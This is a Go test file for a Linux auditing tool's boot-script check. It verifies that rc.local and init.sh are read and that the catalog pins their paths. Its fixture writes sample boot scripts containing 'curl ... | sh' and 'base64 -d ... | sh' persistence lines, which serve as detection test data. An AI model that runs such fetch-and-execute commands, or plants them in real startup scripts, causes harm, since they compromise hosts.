// The boot-script tier (rc.local, init.sh) reads a plain list of files, which is
// also its whole surface: a path dropped from the list stops appearing in the
// report with nothing else changing. One test runs the in-process read over a
// fixture and checks the sh spelling names the same paths. One pins the
// catalog's own list.

package linux

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"karma/internal/model"
	"karma/internal/testkit"
)

// bootScriptFixture is a directory shaped like the boot scripts: two files with a
// line a rule reads and one path that does not exist — a host without that boot
// script is the common case, and it must stay out of the report. The absent path
// leads, so the loop's status is the last existing file's: a literal path that is
// not there leaves the loop's status non-zero, and the walk stays silent about it
// because a failure with no stderr is not a finding (checked live on the test VPS,
// where none of the three boot scripts exists).
func bootScriptFixture(t *testing.T) []string {
	t.Helper()
	dir := t.TempDir()
	rcLocal := filepath.Join(dir, "rc.local")
	initSh := filepath.Join(dir, "init.sh")
	if err := os.WriteFile(rcLocal, []byte("#!/bin/sh\ncurl http://10.0.0.8/i.sh | sh\n"), 0o700); err != nil {
		t.Fatalf("write the fixture: %v", err)
	}
	if err := os.WriteFile(initSh, []byte("#!/bin/sh\nbase64 -d /etc/.x | sh\n"), 0o700); err != nil {
		t.Fatalf("write the fixture: %v", err)
	}
	return []string{filepath.Join(dir, "absent"), rcLocal, initSh}
}

// The tier the boot-script check is built from, over a fixture: the in-process
// read, one section per existing path, and the sh spelling naming the same paths.
func TestReadFilesTierReadsEveryPath(t *testing.T) {
	paths := bootScriptFixture(t)
	steps := readFilesCheck(paths...)
	if len(steps) != 2 || len(steps[0]) != 1 || len(steps[1]) != 1 {
		t.Fatalf("the read-files tier is two steps of one probe: %v", steps)
	}
	inProcess := filesProbe(t, steps[0][0])
	shell := filesProbe(t, steps[1][0])
	for _, path := range paths {
		if !strings.Contains(listScript(t, shell.List), path) {
			t.Fatalf("the list does not name %s: %v", path, shell.List)
		}
	}
	// The in-process list names the existing files alone, and every named path
	// reads as a section of its own.
	list := bodyText(t, inProcess.List)
	for _, want := range []string{paths[1], paths[2]} {
		if !strings.Contains(list, want) {
			t.Fatalf("%q is missing from the tier's list: %q", want, list)
		}
	}
	if strings.Contains(list, paths[0]) {
		t.Fatalf("a path that does not exist should not appear in the report: %q", list)
	}
	for _, want := range []string{"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh"} {
		found := false
		for _, path := range []string{paths[1], paths[2]} {
			if strings.Contains(bodyText(t, inProcess.Read(path)), want) {
				found = true
			}
		}
		if !found {
			t.Fatalf("%q is missing from the tier's reads", want)
		}
	}
}

// The boot-script list is the one this test names: the check reads exactly these
// paths, in process and through the sh source's loop, and dropping one from the
// list is silent at run time — no fixture and no failing read would notice.
func TestBootScriptCheckCoversEveryBootScript(t *testing.T) {
	check := testkit.CheckByID(t, All, "rc-local")
	if len(check.Steps) != 2 || len(check.Steps[0]) != 1 || len(check.Steps[1]) != 1 {
		t.Fatalf("the boot-script check is two steps of one probe: %v", check.Steps)
	}
	inProcess := filesProbe(t, check.Steps[0][0])
	shell := filesProbe(t, check.Steps[1][0])
	_ = inProcess
	want := []string{"/etc/rc.local", "/etc/rc.d/rc.local", "/etc/init.sh"}
	if !slices.Equal(bootScriptPaths, want) {
		t.Errorf("boot-script paths = %v, want %v", bootScriptPaths, want)
	}
	for _, path := range want {
		if !strings.Contains(listScript(t, shell.List), path) {
			t.Errorf("the sh list does not name %s: %v", path, shell.List)
		}
	}
}

// filesProbe is one probe's file list; the test fails when the probe is not one.
func filesProbe(t *testing.T, probe model.Probe) *model.Files {
	t.Helper()
	if probe.Files == nil {
		t.Fatalf("probe %s is not a file list: %+v", probe.Label, probe)
	}
	return probe.Files
}

// listScript is a shell list's script text.
func listScript(t *testing.T, inv model.Invocation) string {
	t.Helper()
	shell, ok := inv.(model.Script)
	if !ok {
		t.Fatalf("the list is not a shell script: %#v", inv)
	}
	return shell.Run
}

// bodyText runs one in-process body.
func bodyText(t *testing.T, inv model.Invocation) string {
	t.Helper()
	body, ok := inv.(model.Native)
	if !ok {
		t.Fatalf("the read is not an in-process body: %#v", inv)
	}
	text, err := body.Body(context.Background())
	if err != nil {
		t.Fatalf("the body failed: %v", err)
	}
	return text
}
